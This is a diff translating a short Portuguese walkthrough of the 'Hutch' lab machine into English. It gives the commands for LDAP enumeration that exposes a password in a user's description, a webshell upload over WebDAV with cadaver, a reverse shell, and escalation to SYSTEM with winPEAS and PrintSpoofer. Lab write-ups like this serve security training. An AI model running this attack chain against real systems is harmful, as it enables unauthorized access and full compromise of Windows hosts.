@@ -1,7 +1,7 @@
 # Hutch
-> DC enum + credenciais LDAP + cadaver WebDAV
+> DC enum + LDAP credentials + cadaver WebDAV
 
-## Enumeração
+## Enumeration
 
 ```
 nmap -sC -sV -oN nmap.txt <IP>
@@ -11,30 +11,30 @@ nmap -sC -sV -oN nmap.txt <IP>
 ldapsearch -x -H ldap://<IP> -b "DC=hutch,DC=offsec" -s sub "(objectClass=user)" | grep -i description
 ```
 
-Senha encontrada na descrição de um usuário no LDAP.
+Password found in a user's LDAP description field.
 
-## Exploração
+## Exploitation
 
-WebDAV habilitado. Upload de webshell com `cadaver`:
+WebDAV enabled. Webshell upload using `cadaver`:
 
 ```
 cadaver http://<IP>/
-# usar credenciais do LDAP
+# use LDAP credentials
 put shell.aspx
 ```
 
-Acesso via browser → reverse shell como usuário de serviço.
+Browser access → reverse shell as service user.
 
-## Escalada de Privilégio
+## Privilege Escalation
 
 ```
 .\winPEAS.exe
 ```
 
-Credenciais de serviço ou token de impersonação disponíveis.
+Service credentials or impersonation token available.
 
 ```
 .\PrintSpoofer.exe -i -c cmd
 ```
 
-SYSTEM obtido.
+SYSTEM obtained.
